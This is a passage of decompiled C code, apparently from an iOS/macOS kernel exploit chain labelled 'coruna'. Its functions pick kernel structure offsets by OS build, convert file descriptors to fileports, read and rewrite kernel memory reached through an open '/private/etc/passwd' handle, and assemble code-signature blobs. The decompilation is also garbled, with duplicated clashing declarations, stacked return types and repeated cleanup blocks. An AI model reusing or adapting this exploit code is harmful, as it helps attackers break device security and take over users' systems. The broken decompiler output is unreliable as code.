                          if (*(unsigned long *)(ptr + 0xe4) == cache_50) {
load_ok_29:
                            type_id_9 = *(unsigned long *)(ptr + 0x56);
                            {
                              if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                              idx = 0;
                              if (cache_32 != -1) {
                              coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
                              }
                              port = cache_27;
                              err = idx;
                              if (cache_27 != 0xffffffff) {
                              if ((cache_22 != 0) && (cache_23 != 0)) {
                              status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
                              err = 5;
                              if (status != 0) {
                              err = idx;
                              }
                              }
                              _close(port);
                              }
                              if (cache_41 != (void *)0x0) {
                              _free(cache_41);
                              }
                              port = (uint)(err == 0);
                              *(uint *)(handle + 2) = port;
                              if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                              return;
                              }
                              ___stack_chk_fail();
                            }
                          }
                          err = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_3(ptr);
                          if ((err == 0) &&
                             (err = coruna_pthread_attr_setdetachstate(ptr,ptr[0xde],cache_50), err != 0)) {
                            {
                              type_id_9 = *(unsigned long *)(ptr + 0x56);
                              {
                              if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                              idx = 0;
                              if (cache_32 != -1) {
                              coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
                              }
                              port = cache_27;
                              err = idx;
                              if (cache_27 != 0xffffffff) {
                              if ((cache_22 != 0) && (cache_23 != 0)) {
                              status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
                              err = 5;
                              if (status != 0) {
                              err = idx;
                              }
                              }
                              _close(port);
                              }
                              if (cache_41 != (void *)0x0) {
                              _free(cache_41);
                              }
                              port = (uint)(err == 0);
                              *(uint *)(handle + 2) = port;
                              if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                              return;
                              }
                              ___stack_chk_fail();
                              }
                            }
                            addr = coruna_kernel600c_via_return_zero_29714(ptr,status[0x11],0);
                            if (addr != 0) {
                              err = coruna_return_zero_2b4e0(ptr,addr,0x10);
                              {
                                type_id_9 = *(unsigned long *)(ptr + 0x56);
                                {
                                if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                                idx = 0;
                                if (cache_32 != -1) {
                                coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
                                }
                                port = cache_27;
                                err = idx;
                                if (cache_27 != 0xffffffff) {
                                if ((cache_22 != 0) && (cache_23 != 0)) {
                                status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
                                err = 5;
                                if (status != 0) {
                                err = idx;
                                }
                                }
                                _close(port);
                                }
                                if (cache_41 != (void *)0x0) {
                                _free(cache_41);
                                }
                                port = (uint)(err == 0);
                                *(uint *)(handle + 2) = port;
                                if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                                return;
                                }
                                ___stack_chk_fail();
                                }
                              }
                            }
                          }
                        }
                      }
                      else {
                        err = coruna_fcntl_24be8(ptr,status[0x11],*(uint64_t *)(ptr + 0xe4));
joined_r0x0002614c:
                        {
                          type_id_9 = *(unsigned long *)(ptr + 0x56);
                          {
                          if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                          idx = 0;
                          if (cache_32 != -1) {
                          coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
                          }
                          port = cache_27;
                          err = idx;
                          if (cache_27 != 0xffffffff) {
                          if ((cache_22 != 0) && (cache_23 != 0)) {
                          status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
                          err = 5;
                          if (status != 0) {
                          err = idx;
                          }
                          }
                          _close(port);
                          }
                          if (cache_41 != (void *)0x0) {
                          _free(cache_41);
                          }
                          port = (uint)(err == 0);
                          *(uint *)(handle + 2) = port;
                          if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                          return;
                          }
                          ___stack_chk_fail();
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
cleanup:
    idx = 5;
    if (cache_32 != -1) {
    coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
    }
    port = cache_27;
    err = idx;
    if (cache_27 != 0xffffffff) {
    if ((cache_22 != 0) && (cache_23 != 0)) {
    status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
    err = 5;
    if (status != 0) {
    err = idx;
    }
    }
    _close(port);
    }
    if (cache_41 != (void *)0x0) {
    _free(cache_41);
    }
    port = (uint)(err == 0);
    *(uint *)(handle + 2) = port;
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
    return;
    }
    ___stack_chk_fail();
  }
  cache_38 = 0;
  cache_39 = (void *)0x0;
  cache_37 = 0xffffffff;
  cache_36 = 0x20000000;
  cache_28 = 0;
  cache_27 = 0;
  cache_22 = 0;
  cache_23 = 0;
  cache_21 = 0;
  err = coruna_ctx_test_flag(ptr,0x5184001);
  port = 0;
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
  return;
  }
  ___stack_chk_fail();
  }
  cache_38 = 0;
  cache_39 = (void *)0x0;
  cache_37 = 0xffffffff;
  cache_36 = 0x20000000;
  cache_28 = 0;
  cache_27 = 0;
  cache_22 = 0;
  cache_23 = 0;
  cache_21 = 0;
  err = coruna_ctx_test_flag(ptr,0x5184001);
  port = 0;
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
  return;
load_ok_31:
  idx = 0;
load_ok_25:
  if (cache_32 != -1) {
    coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
  }
  port = cache_27;
  err = idx;
  if (cache_27 != 0xffffffff) {
    if ((cache_22 != 0) && (cache_23 != 0)) {
      status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
      err = 5;
      if (status != 0) {
        err = idx;
      }
    }
    _close(port);
  }
  if (cache_41 != (void *)0x0) {
    _free(cache_41);
  }
load_ok_42:
  port = (uint)(err == 0);
done:
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
    return;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_return_zero_271dc(long handle,uint64_t *val,unsigned long *arg,uint *size,uint *flags_2,
            uint *count_3)
{
  uint u;
  int err;
  uint32_t *ptr;
  uint64_t size;
  void *ptr;
  uint version;
  unsigned long port;
  long handle;
  int status;
  uint *buf;
  long *buf;
  uint *str;
  uint tag;
  uint *copy;
  long addr;
  unsigned long kind;
  int flags;
  uint type_id;
  
  if (*(int *)(handle + 0x30) == 0) {
    type_id = 0;
    version = *(uint *)(*(long *)(handle + 0x38) + 4);
    version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
    version = version >> 0x10 | version << 0x10;
    flags = 0xc;
  }
  else {
    if (*(int *)(handle + 0x30) != 1) {
      return 0;
    }
    buf = *(uint **)(handle + 0x38);
    version = *buf;
    port = (unsigned long)version;
    if (version == 0) {
      type_id = 0;
      status = 0xc;
    }
    else {
      buf = (long *)(*(long *)(buf + 2) + 8);
      kind = port;
      tag = 0;
      do {
        type_id = tag;
        if (((int)buf[-1] == *(int *)(handle + 0x40)) &&
           (type_id = *(uint *)(*buf + 0x28), (type_id & 0x3fff) != 0 || type_id == 0)) {
          type_id = tag;
        }
        buf = buf + 2;
        kind = kind - 1;
        tag = type_id;
      } while (kind != 0);
      buf = (long *)(*(long *)(buf + 2) + 8);
      status = 0xc;
      do {
        tag = type_id;
        if ((int)buf[-1] != 5 || type_id == 0) {
          tag = (*(uint *)(*buf + 4) & 0xff00ff00) >> 8 |
                   (*(uint *)(*buf + 4) & 0xff00ff) << 8;
          tag = tag >> 0x10 | tag << 0x10;
        }
        status = status + 8 + tag;
        buf = buf + 2;
        port = port - 1;
      } while (port != 0);
    }
    err = *(uint *)(handle + 0x5c) - version;
    flags = err * 8;
    if (*(uint *)(handle + 0x5c) < version || err == 0) {
      flags = 0;
    }
    version = flags + status;
    flags = flags + 0xc;
  }
  port = (unsigned long)version;
  ptr = _malloc(port);
  size = 0;
  if (ptr != (uint32_t *)0x0) {
    _bzero(ptr,port);
    if (*(int *)(handle + 0x30) == 1) {
      buf = *(uint **)(handle + 0x38);
      *ptr = 0xc00cdefa;
      tag = (*buf & 0xff00ff00) >> 8 | (*buf & 0xff00ff) << 8;
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      ptr[1] = version >> 0x10 | version << 0x10;
      ptr[2] = tag >> 0x10 | tag << 0x10;
      if (*buf != 0) {
        addr = 0;
        kind = 0;
        handle = *(long *)(buf + 2);
        copy = ptr + 4;
        version = flags + *buf * 8;
        do {
          flags = *(int *)(handle + addr);
          if (flags == *(int *)(handle + 0x40)) {
            *size = version;
            flags = *(int *)(handle + addr);
          }
          str = flags_2;
          if ((flags == 5) || (str = count_3, flags == 7)) {
            *str = version;
          }
          tag = *(uint *)(handle + addr);
          tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
          u = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
          copy[-1] = tag >> 0x10 | tag << 0x10;
          *copy = u >> 0x10 | u << 0x10;
          ptr = *(void **)((uint *)(handle + addr) + 2);
          tag = *(uint *)((long)ptr + 4);
          tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
          u = tag >> 0x10 | tag << 0x10;
          _memcpy((void *)((long)ptr + (unsigned long)version),ptr,(unsigned long)u);
          handle = *(long *)(buf + 2);
          tag = type_id;
          if (type_id == 0 || *(int *)(handle + addr) != 5) {
            tag = u;
          }
          version = tag + version;
          kind = kind + 1;
          addr = addr + 0x10;
          copy = copy + 2;
        } while (kind < *buf);
      }
      *val = ptr;
      *arg = port;
      size = 1;
    }
    else {
      version = *(uint *)((long)*(void **)(handle + 0x38) + 4);
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      _memcpy(ptr,*(void **)(handle + 0x38),(unsigned long)(version >> 0x10 | version << 0x10));
      *val = ptr;
      *arg = port;
      size = 1;
      *size = 0;
    }
  }
  return size;
}





uint64_t coruna_open_dev_null_27454(long handle,long addr_2,long *off_3,long *ctx_4,int *flags)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  long off;
  long base;
  uint32_t scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  uint host_info;
  long serial_buf;
  unsigned long action;
  long block_ctx;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    block_ctx = 0;
    action = action & 0xffffffff00000000;
    err = *(int *)(handle + 0x140);
    if (err < 0x1f53) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
    }
    else if (1 < err - 0x1f53U && err != 0x2258) {
      return 0;
    }
    err = _open("/dev/null",0);
    if (-1 < err) {
      status = _fileport_makeport(err,&action);
      if (status == 0) {
        off = coruna_kernel600c_via_return_zero_28118(handle,action & 0xffffffff);
        if (off != 0) {
          off = off + 0x38;
          status = coruna_kernel600c_residual_228(handle,off,&block_ctx);
          if ((status != 0) && (status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,off,addr_2), status != 0)) {
            *flags = err;
            *off_3 = off;
            *ctx_4 = block_ctx;
            _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,
                               (mach_port_name_t)action);
            return 1;
          }
        }
        _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)action)
        ;
      }
      _close(err);
    }
    u = 0;
  }
  else {
    off = 0;
    *off_3 = 0;
    *ctx_4 = 0;
    action = 0;
    block_ctx = 0;
    serial_buf = 0;
    thread_attr = 0xffffffff;
    host_info = 0xffffffff;
    scratch = 0xffffffff;
    bootargs = 0xffffffff;
    err = *(int *)(handle + 0x140);
    base = 0x48;
    if (err < 0x2258) {
      addr = 0;
      if ((1 < err - 0x1f53U && err != 0x1809) && err != 0x1c1b) {
        return 0;
      }
    }
    else {
      addr = 0;
      if (err != 0x2258) {
        if ((err != 0x2712) && (err != 0x225c)) {
          return 0;
        }
        addr = 0x74;
        off = 0x40;
        base = 0x50;
      }
    }
    err = _open("/private/etc/passwd",0);
    if (-1 < err) {
fail:
      status = coruna_kernel600c_via_ptr_canonicalize_8(handle,err,&block_ctx);
      if ((status == 0) && (status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,block_ctx + 0x54,&host_info), status != 0)) {
        if ((host_info >> 0xe & 1) == 0) {
          status = coruna_mach_vm_machine_attribute(handle,block_ctx + 0x54,host_info | 0x4000);
          if (status == 0) goto done;
          _close(err);
          err = _open("/private/etc/passwd",0);
          if (err < 0) goto cleanup;
          goto fail;
        }
        status = coruna_kernel600c_residual_228(handle,block_ctx + 0x40,&serial_buf);
        if ((((((status != 0) && (handle = coruna_ptr_canonicalize(handle,serial_buf), handle != 0)) &&
              (status = coruna_kernel600c_residual_228(handle,serial_buf + base,&action), status != 0)) &&
             (handle = coruna_ptr_canonicalize(handle,action), handle != 0)) &&
            ((*(int *)(handle + 0x140) < 0x225c ||
             (((status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,block_ctx + addr,&bootargs), status != 0 &&
               (status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,serial_buf + off,&scratch), status != 0)) &&
              ((status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr + addr_2,&thread_attr), status != 0 &&
               ((status = coruna_mach_vm_machine_attribute(handle,serial_buf + off,thread_attr), status != 0 &&
                (status = coruna_mach_vm_machine_attribute(handle,block_ctx + addr,thread_attr), status != 0)))))))))) &&
           (status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,serial_buf + base,addr_2), status != 0)) {
          status = _open("/private/etc/passwd",0);
          flags = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,serial_buf + base,action);
          if ((flags == 0) ||
             (((0x225b < *(int *)(handle + 0x140) &&
               ((flags = coruna_mach_vm_machine_attribute(handle,block_ctx + addr,bootargs), flags == 0 ||
                (flags = coruna_mach_vm_machine_attribute(handle,serial_buf + off,scratch), flags == 0)))) ||
              (status < 0)))) {
            if (status == -1) goto done;
          }
          else {
            flags = coruna_kernel600c_via_ptr_canonicalize_8(handle,status,&block_ctx);
            if ((flags == 0) && (block_ctx == addr_2)) {
              *flags = status;
              u = 1;
              goto check_ok;
            }
          }
          _close(status);
        }
      }
done:
      u = 0;
      goto check_ok;
    }
cleanup:
    u = 0;
    if (err != -1) {
check_ok:
      _close(err);
    }
  }
  return u;
}





void coruna_memcpy_22bcc(long handle,void *ctx)
{
  uint u;
  long handle;
  uint64_t size;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (handle != 0) {
    scratch = 0x30;
    u = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
    size = coruna_cc_sha256_update(*(uint8_t *)(handle + 0x25),handle,u >> 0x10 | u << 0x10,
                         bootargs,&scratch);
    if ((int)size != 0) {
      _memcpy(ctx,bootargs,(unsigned long)scratch);
      size = 1;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(size);
}





uint64_t
void coruna_kernel600c_via_kernel600c_via_vm_deallocate_2(uint64_t val,uint64_t id_2,unsigned long arg,uint64_t size_3,
            uint64_t off_4)
{
  uint64_t u;
  long scratch;
  
  u = coruna_kernel600c_residual_228(val,id_2,&scratch);
  if ((int)u != 0) {
    do {
      u = coruna_kernel600c_via_vm_deallocate(val,scratch + (arg & 0xffffffff),size_3,off_4);
      if ((int)u == 0) {
        return u;
      }
      u = coruna_kernel600c_residual_228(val,scratch,&scratch);
      if ((int)u == 0) {
        return u;
      }
    } while (scratch != 0);
    u = 1;
  }
  return u;
}





uint32_t coruna_kernel600c_via_ctx_test_flag_13(long handle)
{
  int err;
  int status;
  uint32_t u;
  uint32_t size;
  
  status = coruna_ctx_test_flag(handle,0x5184001);
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2) {
    size = 0xd0;
    if (status != 0) {
      size = 0xd8;
    }
    u = 0xc0;
    if (status != 0) {
      u = 200;
    }
    if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
      size = u;
    }
  }
  else if (err == 0x1c1b) {
    u = 0xb0;
    size = 0xa8;
    if (status != 0) {
      u = 0xb8;
      size = 0xb0;
    }
    if (0x1c1b19145fffff < *(unsigned long *)(handle + 0x158)) {
      size = u;
    }
  }
  else {
    u = 0xb0;
    if (status != 0) {
      u = 0xb8;
    }
    size = 0;
    if (err == 0x1809) {
      size = u;
    }
  }
  return size;
}





uint coruna_fcntl_27a74(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  uint size;
  uint32_t scratch;
  unsigned long bootargs;
  uint32_t *thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = (unsigned long)(0x20000000 - *(int *)(handle + 0x180));
  thread_attr = &scratch;
  host_info = 4;
  err = _open("/usr/lib/dyld",0);
  if (err < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    size = -*ptr;
    if (-1 < err) {
      size = *ptr;
    }
    size = size | 0x40000000;
  }
  else {
    status = _fcntl(err,0x3b);
    if ((status == 0) || (err = ___error(), *err != 0x55)) {
      size = 0x1001;
    }
    else {
      size = 0;
    }
    u = _close(err);
    ptr = (uint *)(unsigned long)u;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return size;
  }
  ___stack_chk_fail(ptr);
}





uint64_t coruna_iokit_msg_free(uint8_t *buf)
{
  uint u;
  
  *buf = 1;
  do {
    u = **(uint **)(buf + 0x18);
    if ((u >> 0x1a & 1) != 0) {
      **(uint **)(buf + 0x18) = u & 0xfbffffff;
      DataSynchronizationBarrier(2,3,0);
      return 0;
    }
  } while (buf[1] == '\0');
  return 0;
}





uint64_t coruna_fcntl_27b88(long handle,int *flags)
{
  int err;
  int *err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  unsigned long sa_saved;
  uint64_t *sa_new;
  uint64_t path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  stack_guard = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  action = 0;
  serial_buf = 0;
  serial_buf = 0;
  host_info = 0;
  host_info = 0;
  scratch = k_kernel_rodata_word_37790;
  bootargs = 0x20200;
  _uStack_a0 = coruna_cat((char)*(uint32_t *)k_kernel_vm_page_shift_slot,0x22000000000);
  scratch = 0;
  thread_attr = 0;
  sa_saved = (unsigned long)(0x20000000 - *(int *)(handle + 0x180));
  sa_new = &scratch;
  path_buf = 0x70;
  err = _fcntl(*flags,0x3b);
  if ((err != 0) && (err = ___error(), *err == 1)) {
    ___error();
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return 0;
  }
  ___stack_chk_fail();
}





uint64_t coruna_mach_thread_self(long handle)
{
  int err;
  mach_port_t lm2;
  mach_port_t lm3;
  uint u;
  uint64_t size;
  uint scratch;
  
  size = 0x2801f;
  *(uint64_t *)(&UNK_000018c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_mach_absolute_time();
  err = coruna_ctx_test_flag(handle,0x400);
  if (err != 0) {
    scratch = 0;
    err = coruna_msu_statfs_probe(handle,&scratch);
    if (err == 0) {
      return 0x28020;
    }
    if (scratch != 3) {
      u = *(uint *)(handle + 600);
      if (1 < u) {
        if (u != 3) {
          return 0x28020;
        }
        u = 0;
      }
      if ((scratch != u) && (err = coruna_chown_rmdir(handle), err == 0)) {
        return 0x28020;
      }
    }
  }
  err = coruna_ctx_test_flag(handle,4);
  if (((err == 0) || (err = coruna_kernel600c_via_ctx_test_flag_2(handle,0), err != 0)) &&
     ((*(long *)(&k_kernel_slot_1900 + handle) == 0 ||
      (err = coruna_task_info_249e8(handle,*(uint32_t *)k_kernel_mach_task_self_slot,2,
                            &k_kernel_slot_1908 + handle,8), err != 0)))) {
    lm3 = *(mach_port_t *)(&k_kernel_slot_192c + handle);
    if ((1 < lm3 + 1) && (lm2 = _mach_thread_self(), lm3 == lm2)) {
      lm3 = _mach_thread_self();
      err = coruna_kernel600c_via_kernel600c_via_ioconnectcallmethod_9(handle,lm3,0);
      if (err == 0) {
        return 0x2801f;
      }
    }
    if (((*(int *)(&k_kernel_slot_1910 + handle) == 0 && *(int *)(&k_kernel_slot_1914 + handle) == 0) ||
        (err = coruna_getuid(handle,*(int *)(&k_kernel_slot_1910 + handle),
                              *(int *)(&k_kernel_slot_1914 + handle),0), err != 0)) &&
       ((lm3 = _mach_host_self(), lm3 == *(mach_port_t *)(&k_kernel_slot_1928 + handle) ||
        ((err = coruna_ctx_test_flag(handle,0x10), err != 0 ||
         (err = coruna_task_get_special_port_24e04(handle,*(uint32_t *)k_kernel_mach_task_self_slot,
                               *(uint32_t *)(&k_kernel_slot_1928 + handle)), err != 0)))))) {
      coruna_kernel600c_via_vm_allocate(handle);
      size = 0;
    }
  }
  return size;
}





void coruna_kernel600c_via_mach_port_request_notification_2c77c(long handle,uint *size)
{
  uint u;
  uint size;
  int err;
  uint version;
  int status;
  long handle;
  
  status = coruna_ctx_test_flag(handle,0x5184001);
  if (status != 0) {
    u = *size;
    if (0x1ff8 < u) {
      size = *(uint *)(handle + 0x180);
      version = 0;
      if (size != 0) {
        version = u / size;
      }
      err = u - version * size;
      status = 0;
      if (err != 0) {
        status = size - err;
      }
      handle = coruna_mach_port_destroy(handle,status + u);
      if (handle != 0) {
        *size = status + u;
      }
      return;
    }
  }
  coruna_mach_port_request_notification_2c77c(handle,size);
  return;
}





void coruna_kernel5_via_bzero_5(uint *size)
{
  unsigned long u;
  long handle;
  
  if (*size != 0) {
    u = 0;
    handle = 8;
    do {
      coruna_bzero(*(uint64_t *)(*(long *)(size + 2) + handle));
      u = u + 1;
      handle = handle + 0x10;
    } while (u < *size);
  }
  _free(*(void **)(size + 2));
  _free(size);
  return;
}





uint coruna_iokit_msg_append(uint *size,uint32_t size_x,uint64_t val)
{
  uint32_t *ptr;
  void *ptr;
  uint u;
  
  u = *size;
  if (u < size[1]) {
    ptr = *(void **)(size + 2);
  }
  else {
    u = size[1] << 1;
    ptr = _realloc(*(void **)(size + 2),(unsigned long)u << 4);
    if (ptr == (void *)0x0) {
      return 0xffffffff;
    }
    size[1] = u;
    *(void **)(size + 2) = ptr;
    u = *size;
  }
  ptr = (uint32_t *)((long)ptr + (unsigned long)u * 0x10);
  *ptr = size_x;
  *(uint64_t *)(ptr + 2) = val;
  *size = u + 1;
  return u + 1;
}





uint64_t * coruna_malloc(void)
{
  uint64_t *ptr;
  void *ptr;
  
  ptr = _malloc(0x10);
  if (ptr != (uint64_t *)0x0) {
    ptr = _malloc(0x40);
    if (ptr == (void *)0x0) {
      _free(ptr);
      ptr = (uint64_t *)0x0;
    }
    else {
      ptr[1] = ptr;
      *ptr = k_kernel_rodata_word_37798;
    }
  }
  return ptr;
}





uint coruna_pread(int flags,long handle,unsigned long arg,long addr_2)
{
  int err;
  bool err;
  unsigned long u;
  int *err;
  uint *ptr;
  unsigned long size;
  uint version;
  
  if (arg != 0) {
    size = 0;
    do {
      version = 0;
      while (u = _pread(flags,(void *)(handle + size),arg - size,size + addr_2),
            u == 0xffffffffffffffff) {
        err = ___error();
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        version = -*ptr;
        if (-1 < err) {
        version = *ptr;
        }
        return version | 0x40000000;
      }
      if ((long)u < 0) {
fail:
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        version = -*ptr;
        if (-1 < err) {
          version = *ptr;
        }
        return version | 0x40000000;
      }
      if (arg < u) {
        return 0xad014;
      }
      err = CARRY8(u,size);
      size = u + size;
      if (err) {
        return 0xad014;
      }
      if (arg < size) {
        return 0xad014;
      }
    } while (size < arg);
  }
  return 0;
}





long coruna_return_zero_2af7c(long handle,long addr_2)
{
  int err;
  bool err;
  long handle;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      handle = 0x68;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x58;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x48;
  }
  return handle + addr_2;
}





long coruna_return_zero_28118(long handle,uint64_t val)
{
  int err;
  long handle;
  uint8_t scratch;
  byte scratch;
  long bootargs;
  
  err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,val,&scratch);
  if (err != 0) {
    handle = coruna_return_zero_2af7c(handle,val);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(handle,handle,&bootargs);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(handle,bootargs);
      if (handle == 0) {
        return 0;
      }
      if ((*(unsigned long *)(handle + 0x158) < 0x1f530000000000) && ((scratch >> 2 & 1) != 0)) {
        err = coruna_kernel600c_residual_228(handle,bootargs + *(int *)(handle + 0x168),&bootargs);
        if (err == 0) {
          return 0;
        }
        handle = coruna_ptr_canonicalize(handle,bootargs);
        if (handle == 0) {
          return 0;
        }
      }
      return bootargs;
    }
  }
  return 0;
}





long coruna_return_zero_2b0c0(long handle,long addr_2)
{
  int err;
  bool err;
  int status;
  long handle;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      handle = 0x90;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        handle = 0x98;
      }
    }
    else if (err == 0x1c1b) {
      handle = 0x90;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x80;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x70;
  }
  return handle + addr_2;
}





long coruna_return_zero_2b0c0_28280(long handle,long addr_2)
{
  int err;
  bool err;
  int status;
  long handle;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      handle = 0xa0;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        handle = 0xa8;
      }
    }
    else if (err == 0x1c1b) {
      handle = 0xa0;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x90;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x80;
  }
  return handle + addr_2;
}





mach_port_t coruna_processor_set_default(long handle)
{
  uid_t u;
  mach_port_t lm2;
  kern_return_t lk3;
  mach_msg_type_number_t scratch;
  integer_t bootargs [2];
  host_t thread_attr;
  processor_set_name_t host_info;
  
  thread_attr = 0;
  scratch = 2;
  if ((*(char *)(handle + 10) != '\0') && (u = _getuid(), u != 0)) {
    lm2 = _mach_host_self();
    return lm2;
  }
  lm2 = _mach_host_self();
  lk3 = _processor_set_default(lm2,&host_info);
  if (lk3 == 0) {
    lk3 = _processor_set_info(host_info,5,&thread_attr,bootargs,&scratch);
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
  }
  if (lk3 == 0x35) {
    thread_attr = _mach_host_self();
  }
  return thread_attr;
}





void coruna_kernel600c_via_return_zero_28118(long handle,uint64_t val)
{
  int err;
  long handle;
  int status;
  
  err = *(int *)k_kernel_mach_task_self_slot;
  status = (int)val;
  if ((err != status) || (*(long *)(handle + 0x1b0) == 0)) {
    if (status == -1) {
      coruna_kernel600c_via_return_zero_28118_2(handle);
      return;
    }
    handle = coruna_kernel600c_via_return_zero_290d4(handle,err,val);
    if (((handle != 0) && (handle = coruna_return_zero_28118(handle,handle), err == status && handle != 0)) &&
       (*(long *)(handle + 0x1b0) == 0)) {
      *(long *)(handle + 0x1b0) = handle;
    }
  }
  return;
}





long coruna_kernel600c_via_return_zero_28118_2(long handle)
{
  long handle;
  
  handle = *(long *)(&k_kernel_slot_19d8 + handle);
  if (handle == 0) {
    if (*(long *)(&k_kernel_slot_19d0 + handle) != 0) {
      handle = coruna_return_zero_28118();
      return handle;
    }
    if (*(int *)(&k_kernel_slot_191c + handle) != -1) {
      if (*(int *)(&k_kernel_slot_191c + handle) != 0) {
fail:
        handle = coruna_kernel600c_via_return_zero_28118();
        return handle;
      }
      handle = coruna_kernel600c_via_return_zero_28118();
      return handle;
    }
    handle = 0;
  }
  return handle;
}





void coruna_ret_stub_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel600c_via_return_zero_290d4(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}





uint64_t coruna_return_zero_284c4(long handle,long addr_2)
{
  bool err;
  bool status;
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
